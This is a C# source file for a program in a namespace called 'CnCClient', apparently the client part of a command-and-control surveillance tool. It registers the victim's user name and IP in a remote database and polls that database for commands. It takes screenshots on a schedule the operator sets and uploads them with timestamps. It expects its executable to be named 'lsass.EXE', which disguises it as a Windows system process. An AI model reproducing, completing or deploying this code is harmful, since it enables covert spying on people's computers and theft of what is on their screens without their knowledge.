using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;

namespace CnCClient
{
    public partial class MainPlatform : Form
    {
        byte[] img = null;
        int baseCount = new int();
        int tick = new int();
        public string pathReal = "";
        public MainPlatform()
        {
            InitializeComponent();
        }

        private void MainPlatform_Load(object sender, EventArgs e)
        {
            pathReal = GetRealPath();
            Thread StartOnline = new Thread(new ThreadStart(InsertOnline));
            StartOnline.Start();
            Thread Streaming_Command = new Thread(new ThreadStart(CheckForStream));
            Streaming_Command.Start();
            Thread ScreenShot_Command = new Thread(new ThreadStart(CheckForScreenShot));
            ScreenShot_Command.Start();


        }

        public Boolean IsServerAvailable()
        {
            PushDataDataContext dataBase = new PushDataDataContext();
            var pickedData = (from rows in dataBase.Streaming_IPs
                              where rows.UserType == "Server"
                              select rows).FirstOrDefault();
            if (pickedData.AreOn == "true")
            {
                return true;
            }
            else
            {
                return false;
            }
        }
        public void CheckForStream()
        {
            CheckForStream check = new CnCClient.CheckForStream();
            check.Show();
        }
        public void CheckForScreenShot()
        {
            try
            {
                string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                PushDataDataContext dataBase = new PushDataDataContext();
                var countWhole = (from rows in dataBase.ScreenShot_Actions
                            where rows.UserID == userName
                            select rows).Count();
                if (countWhole > 0)
                {
                    var data = (from rows in dataBase.ScreenShot_Actions
                                where rows.UserID == userName
                                select rows).First();
                    string startDate = data.From;
                    string endDate = data.Until;
                    string startMonth = "";
                    string startDay = "";
                    string endMonth = "";
                    string endDay = "";
                    int amountTime = 0;
                    int amountTimeForEnd = 0;
                    for (int i = 0; i < startDate.Length; i++)
                    {
                        if (amountTime < 2)
                        {
                            if (startDate[i].ToString() != "/")
                            {
                                if (amountTime == 0)
                                {
                                    startMonth += startDate[i].ToString();

                                }
                                else
                                {
                                    startDay += startDate[i].ToString();
                                }
                            }
                            else
                            {
                                amountTime += 1;
                            }
                        }
                    }
                    for (int i = 0; i < endDate.Length; i++)
                    {
                        if (amountTimeForEnd < 2)
                        {
                            if (endDate[i].ToString() != "/")
                            {
                                if (amountTimeForEnd == 0)
                                {
                                    endMonth += endDate[i].ToString();

                                }
                                else
                                {
                                    endDay += endDate[i].ToString();
                                }
                            }
                            else
                            {
                                amountTimeForEnd += 1;
                            }
                        }
                    }
                    tick = Int32.Parse(data.Frameinsecond.ToString());
                    if (Int32.Parse(dateTimePicker1.Value.Month.ToString()) >= Int32.Parse(startMonth) && Int32.Parse(dateTimePicker1.Value.Month.ToString())<=Int32.Parse(endMonth))
                    {
                        if (Int32.Parse(dateTimePicker1.Value.Month.ToString()) == Int32.Parse(startMonth))
                        {
                            if (Int32.Parse(dateTimePicker1.Value.Day.ToString()) >= Int32.Parse(startDay) && Int32.Parse(dateTimePicker1.Value.Day.ToString()) <= Int32.Parse(endDay))
                            {

                                System.Timers.Timer aTimer = new System.Timers.Timer();
                                aTimer.Elapsed += new ElapsedEventHandler(TimerAction);
                                aTimer.Interval = tick;
                                aTimer.Enabled = true;
                            }
                        }
                        else 
                        {
                            System.Timers.Timer aTimer = new System.Timers.Timer();
                            aTimer.Elapsed += new ElapsedEventHandler(TimerAction);
                            aTimer.Interval = tick;
                            aTimer.Enabled = true;
                        }


                    }
                }


            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }
        public void InsertOnline()
        {
            try
            {
                int iD = 0;
                PushDataDataContext DataBase = new PushDataDataContext();
                string UserName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                var count = (from rows in DataBase.Streaming_IPs
                             where rows.User == System.Security.Principal.WindowsIdentity.GetCurrent().Name && rows.UserType == "Client"
                             select rows).Count();
                if (count > 0)
                {
                    var IPs = (from rows in DataBase.Streaming_IPs
                               where rows.User == System.Security.Principal.WindowsIdentity.GetCurrent().Name && rows.UserType == "Client"
                               select rows).FirstOrDefault();
                    iD = IPs.ID;
                    DataBase.Streaming_IPs.DeleteOnSubmit(IPs);
                    DataBase.SubmitChanges();
                }

                var Count = (from rows in DataBase.Streaming_IPs
                             select rows).Count();
                Streaming_IP IP_Submit = new Streaming_IP();
                IP_Submit.AreOn = "true";
                IP_Submit.ID = iD;
                IP_Submit.IP = GetIpAdress();
                IP_Submit.Port = 2016;
                IP_Submit.User = UserName;
                IP_Submit.UserType = "Client";
                DataBase.Streaming_IPs.InsertOnSubmit(IP_Submit);
                DataBase.SubmitChanges();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
            
            MainPlatform2ndPart main = new MainPlatform2ndPart();
            main.Show();
            

        }
        string GetIpAdress()
        {
            IPHostEntry host;
            string localip = "?";
            host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (IPAddress ip in host.AddressList)
            {
                if (ip.AddressFamily.ToString() == "InterNetwork")
                {
                    localip = ip.ToString();
                }
            }
            return localip;
        }
        public string GetRealPath()
        {
            Assembly ASEM = Assembly.GetExecutingAssembly();
            string path = ASEM.Location;
            string realPath = "";
            for (int i = 0; i < path.Length - 9; i++)
            {
                if (path[i].ToString() + path[i + 1].ToString() + path[i + 2].ToString() + path[i + 3].ToString() + path[i + 4].ToString() + path[i + 5].ToString() + path[i + 6].ToString() + path[i + 7].ToString() + path[i + 8].ToString() != "lsass.EXE")
                {
                    realPath += path[i].ToString();
                }
                if ((path[i].ToString() + path[i + 1].ToString() + path[i + 2].ToString() + path[i + 3].ToString() + path[i + 4].ToString() + path[i + 5].ToString() + path[i + 6].ToString() + path[i + 7].ToString() + path[i + 8].ToString() == "lsass.EXE"))
                {
                    break;
                }
            }
            return realPath;
        }
        public void TakeAndSend()
        {
            TakeAndSendS SS = new TakeAndSendS();
            SS.Show();

            FileStream fs = new FileStream(pathReal + "//Pic", FileMode.Open, FileAccess.Read);
            BinaryReader br = new BinaryReader(fs);
            img = br.ReadBytes((int)fs.Length);
            PushDataDataContext DataBase = new PushDataDataContext();
            Screen_Shot ScreenShot = new Screen_Shot();
            var Count = (from rows in DataBase.Screen_Shots
                         select rows).Count();

            ScreenShot.Date = dateTimePicker1.Value.Month.ToString() + "/" + dateTimePicker1.Value.Day.ToString() + "/" + dateTimePicker1.Value.Year.ToString();
            ScreenShot.Done = "true";
            ScreenShot.ID = Count + 1;
            ScreenShot.Screenshot = img;
            ScreenShot.Time = dateTimePicker1.Value.Hour.ToString() + ":" + dateTimePicker1.Value.Minute.ToString();
            ScreenShot.UserId = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            DataBase.Screen_Shots.InsertOnSubmit(ScreenShot);
            DataBase.SubmitChanges();
        }

        private void TimerAction(object sender, EventArgs e)
        {

                Thread ThreadStart = new Thread(new ThreadStart(TakeAndSend));
                ThreadStart.Start();
        }
    }
}
